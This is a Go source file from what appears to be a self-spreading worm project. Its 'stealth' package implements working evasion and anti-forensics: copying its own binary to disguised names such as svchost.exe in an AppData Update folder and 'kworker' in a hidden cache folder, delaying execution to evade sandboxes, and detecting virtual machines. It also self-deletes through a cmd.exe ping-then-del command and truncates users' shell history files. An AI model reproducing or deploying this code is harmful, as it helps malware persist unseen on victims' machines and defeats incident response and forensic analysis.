/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/glowworm
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

// Package stealth provides evasion and anti-forensics capabilities.
//
// Stealth mode helps the worm avoid detection by:
// - Hiding the process from casual observation
// - Cleaning up after successful spread
// - Blending in with legitimate system processes
package stealth

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

// Config holds stealth behavior settings.
type Config struct {
	// HideProcess renames the process to look legitimate
	HideProcess bool

	// SelfDelete removes the binary after spreading
	SelfDelete bool

	// CleanLogs attempts to clear evidence from system logs
	CleanLogs bool

	// DelayStart waits before executing to evade sandbox analysis
	DelayStart time.Duration
}

// DefaultConfig returns sensible stealth defaults.
func DefaultConfig() Config {
	return Config{
		HideProcess: true,
		SelfDelete:  false, // ponytail: off by default, destructive
		CleanLogs:   false,
		DelayStart:  0,
	}
}

// Apply activates stealth measures based on config.
func Apply(cfg Config) error {
	if cfg.DelayStart > 0 {
		// Sandbox evasion: many sandboxes only run for ~60s
		time.Sleep(cfg.DelayStart)
	}

	if cfg.HideProcess {
		if err := hideProcess(); err != nil {
			// Non-fatal, continue anyway
			fmt.Fprintf(os.Stderr, "stealth: hide process failed: %v\n", err)
		}
	}

	return nil
}

// SelfDestruct removes the binary and exits.
// Call this after successful spread to leave no trace.
func SelfDestruct() error {
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("get executable path: %w", err)
	}

	if runtime.GOOS == "windows" {
		// Windows can't delete running executables directly.
		// Schedule deletion via cmd.exe after we exit.
		script := fmt.Sprintf(
			`ping 127.0.0.1 -n 3 > nul & del /f /q "%s"`,
			exe,
		)
		cmd := exec.Command("cmd.exe", "/C", script)
		cmd.Start() // Fire and forget
	} else {
		// Unix: we can unlink ourselves while running
		if err := os.Remove(exe); err != nil {
			return fmt.Errorf("remove executable: %w", err)
		}
	}

	os.Exit(0)
	return nil // unreachable
}

// hideProcess attempts to make the process less visible.
func hideProcess() error {
	if runtime.GOOS == "windows" {
		return hideProcessWindows()
	}
	return hideProcessUnix()
}

// hideProcessWindows uses various Windows techniques.
func hideProcessWindows() error {
	// ponytail: just copy to a legit-looking location
	// Real malware would use process hollowing, but that's complex
	exe, err := os.Executable()
	if err != nil {
		return err
	}

	// Copy to AppData with innocent name
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return fmt.Errorf("APPDATA not set")
	}

	targetDir := filepath.Join(appdata, "Microsoft", "Windows", "Update")
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return err
	}

	target := filepath.Join(targetDir, "svchost.exe") // ponytail: classic hiding name
	if _, err := os.Stat(target); err == nil {
		// Already copied
		return nil
	}

	data, err := os.ReadFile(exe)
	if err != nil {
		return err
	}

	return os.WriteFile(target, data, 0755)
}

// hideProcessUnix attempts Unix-specific hiding.
func hideProcessUnix() error {
	// ponytail: rename process via argv[0] manipulation
	// This is visible in /proc/self/comm but not ps aux
	exe, err := os.Executable()
	if err != nil {
		return err
	}

	// Copy to hidden location
	home := os.Getenv("HOME")
	if home == "" {
		home = "/tmp"
	}

	targetDir := filepath.Join(home, ".cache", ".system")
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return err
	}

	target := filepath.Join(targetDir, "kworker") // ponytail: looks like kernel thread
	if _, err := os.Stat(target); err == nil {
		return nil
	}

	data, err := os.ReadFile(exe)
	if err != nil {
		return err
	}

	return os.WriteFile(target, data, 0755)
}

// ClearTraces attempts to remove evidence of the worm.
func ClearTraces() error {
	var errs []error

	// Remove common log entries (best effort)
	if runtime.GOOS != "windows" {
		// Clear bash history for current user
		home := os.Getenv("HOME")
		if home != "" {
			histFiles := []string{
				filepath.Join(home, ".bash_history"),
				filepath.Join(home, ".zsh_history"),
			}
			for _, f := range histFiles {
				// Truncate rather than delete (less suspicious)
				if file, err := os.OpenFile(f, os.O_TRUNC|os.O_WRONLY, 0644); err == nil {
					file.Close()
				}
			}
		}
	}

	// Remove the "youve-been-glowed.txt" files we dropped
	glowFiles := []string{
		"/tmp/youve-been-glowed.txt",
		filepath.Join(os.Getenv("HOME"), "youve-been-glowed.txt"),
		filepath.Join(os.Getenv("USERPROFILE"), "Desktop", "youve-been-glowed.txt"),
	}
	for _, f := range glowFiles {
		os.Remove(f) // Ignore errors
	}

	if len(errs) > 0 {
		return fmt.Errorf("some traces could not be cleared")
	}
	return nil
}

// IsVirtualized checks if we're running in a VM/sandbox.
// Returns true if virtualization detected (suggests analysis environment).
func IsVirtualized() bool {
	if runtime.GOOS == "windows" {
		return isVirtualizedWindows()
	}
	return isVirtualizedUnix()
}

func isVirtualizedWindows() bool {
	// Check for common VM artifacts
	vmFiles := []string{
		`C:\Windows\System32\drivers\VBoxMouse.sys`,
		`C:\Windows\System32\drivers\vmhgfs.sys`,
		`C:\Windows\System32\drivers\vmmouse.sys`,
	}
	for _, f := range vmFiles {
		if _, err := os.Stat(f); err == nil {
			return true
		}
	}
	return false
}

func isVirtualizedUnix() bool {
	// Check /sys/class/dmi/id for VM identifiers
	data, err := os.ReadFile("/sys/class/dmi/id/product_name")
	if err != nil {
		return false
	}

	vmIndicators := []string{
		"VirtualBox",
		"VMware",
		"QEMU",
		"KVM",
		"Xen",
		"Parallels",
	}

	product := string(data)
	for _, indicator := range vmIndicators {
		if contains(product, indicator) {
			return true
		}
	}
	return false
}

func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(s) > 0 && containsAt(s, substr, 0))
}

func containsAt(s, substr string, start int) bool {
	for i := start; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
